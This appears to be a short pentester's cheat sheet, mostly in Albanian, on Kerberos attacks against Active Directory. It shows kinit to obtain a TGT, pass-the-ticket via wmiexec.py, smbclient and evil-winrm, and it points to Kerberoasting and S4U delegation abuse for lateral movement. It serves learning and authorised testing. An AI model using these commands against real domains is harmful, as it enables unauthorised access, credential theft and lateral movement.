Kerberos është **protokolli i autentikimit** i Windows Active Directory.


##                                       **Connect** 

#### **Using kinit (Get TGT)**
If we have the credentials of a user in AD we can use Kerberos client to obtain Ticket Granting Tickets.

#### **Why do we need a TGT ticket?**
Ticket na lejon të hyjmë në një shërbim kurse TGT na lejon të marrim bileta të tjera TGT dhe të hyjmë në shërbime të ndryshme të AD

```bash
# Request Ticket Granting Ticket
kinit username@DOMAIN.COM

# With password
echo 'password' | kinit username@DOMAIN.COM

# Check tickets
klist

# Destroy tickets
kdestroy
```

### **Për çfarë e përdorim `kinit` në pentesting?**

- Për të konfirmuar nëse një username + password janë të sakta
- Për të marrë TGT nëse kemi kredenciale të vërteta
- Për të ngarkuar një ccache (biletë Kerberos) në memorie
- Për të vepruar si një përdorues normal në AD

### **Cfare bejm nese marrim nje bilete TGT**

Nje bilete TGT ka akses ne sherbime te ndryshme te nje AD ndryshe nga Ticket qe ka akses vetem ne nje sherbime, dhe na lejon te marrim TGT e perdoruesve te tjere nqs ka.

**Pasi merr një TGT:**

1. Mund të testosh shërbime (SMB, WinRM, WM, MSSQL, LDAP, RDP, Web Apps, File Shares).
2. Mund të marrësh TGS për shërbime specifike.
3. Mund të Kerberoast-osh përdoruesit e tjerë.
4. Mund të marrësh TGT të përdoruesve të tjerë (me hash, pass-the-key, AS-REP).
5. Pastaj teston përsëri për akses të ri → deri sa gjen një përdorues me akses të lartë (WinRM / admin).

### Pasi merr TGT → kontrollon këto:

1. Pasi kemi nje TGT provojm Pass-The-Ticket
```
export KRB5CCNAME=user1.ccache
wmiexec.py DOMAIN/user1@<IP> -k
```

2. Kontrollojm SMB per aksesin qe ka ky user-e, duke perdorur bileten qe kemi ne memorie
```
smbclient -k //server/share
```

3. Teston WinRM
```
KRB5CCNAME=/root/user.ccache evil-winrm -i 192.168.1.10 -r domain.local -u user
```

4. Testojm WMI
```
KRB5CCNAME=user.ccache wmiexec.py domain.local/user@dc01.domain.local
```

5. A ka SPN që mund të kerberoastosh? → për të thyer hash offline.

 6️. Mund të bësh S4U2Self + S4U2Proxy? → lateral movement si service account.